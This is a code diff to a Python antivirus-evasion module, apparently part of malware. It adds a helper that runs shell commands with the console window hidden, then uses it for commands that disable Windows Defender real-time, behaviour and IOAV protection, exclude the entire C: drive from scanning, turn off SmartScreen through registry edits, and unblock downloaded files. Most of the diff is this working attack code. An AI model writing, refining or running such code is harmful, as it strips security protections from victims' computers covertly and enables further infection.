@@ -10,7 +10,45 @@ import time
 import ctypes
 import hashlib
 import base64
+import subprocess
 from pathlib import Path
+
+
+def run_hidden_command(cmd, timeout=5):
+    """
+    Execute a command without showing any window
+    Works on Windows to prevent CMD flash
+    """
+    if sys.platform == 'win32':
+        try:
+            # Windows-specific: hide window completely
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            startupinfo.wShowWindow = 0  # SW_HIDE
+
+            result = subprocess.run(
+                cmd,
+                shell=True,
+                capture_output=True,
+                timeout=timeout,
+                startupinfo=startupinfo,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            return result.returncode == 0
+        except:
+            return False
+    else:
+        # Linux/Unix
+        try:
+            result = subprocess.run(
+                cmd,
+                shell=True,
+                capture_output=True,
+                timeout=timeout
+            )
+            return result.returncode == 0
+        except:
+            return False
 
 
 class AVEvasion:
@@ -175,15 +213,15 @@ class AVEvasion:
             # Try to disable Windows Defender Real-Time Protection
             # This requires admin rights and will likely be blocked
             commands = [
-                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
-                'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
-                'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
-                'powershell -Command "Add-MpPreference -ExclusionPath \\"C:\\\\\\""',
+                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul',
+                'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" 2>nul',
+                'powershell -Command "Set-MpPreference -DisableIOAVProtection $true" 2>nul',
+                'powershell -Command "Add-MpPreference -ExclusionPath \\"C:\\\\\\""  2>nul',
             ]
 
             for cmd in commands:
                 try:
-                    os.system(cmd + ' 2>nul')
+                    run_hidden_command(cmd)
                 except:
                     pass
 
@@ -202,8 +240,7 @@ class AVEvasion:
 
         try:
             cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{path}\\"" 2>nul'
-            result = os.system(cmd)
-            return result == 0
+            return run_hidden_command(cmd)
         except:
             return False
 
@@ -495,26 +532,24 @@ class AVEvasion:
             return False
 
         try:
-            import subprocess
-
             # Registry keys to disable SmartScreen
             commands = [
                 # Disable SmartScreen for apps and files
-                r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f',
+                r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f 2>nul',
 
                 # Disable SmartScreen in Edge
-                r'reg add "HKCU\Software\Microsoft\Edge\SmartScreenEnabled" /t REG_DWORD /d 0 /f',
+                r'reg add "HKCU\Software\Microsoft\Edge\SmartScreenEnabled" /t REG_DWORD /d 0 /f 2>nul',
 
                 # Disable SmartScreen in IE
-                r'reg add "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter" /v EnabledV9 /t REG_DWORD /d 0 /f',
+                r'reg add "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter" /v EnabledV9 /t REG_DWORD /d 0 /f 2>nul',
 
                 # Disable for Store apps
-                r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f',
+                r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f 2>nul',
             ]
 
             for cmd in commands:
                 try:
-                    subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
+                    run_hidden_command(cmd)
                 except:
                     pass
 
@@ -541,11 +576,10 @@ class AVEvasion:
             except:
                 pass
 
-            # Alternative method using PowerShell
+            # Alternative method using PowerShell (hidden)
             try:
-                import subprocess
                 cmd = f'powershell -Command "Unblock-File -Path \\"{file_path}\\"" 2>nul'
-                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
+                run_hidden_command(cmd)
             except:
                 pass
 
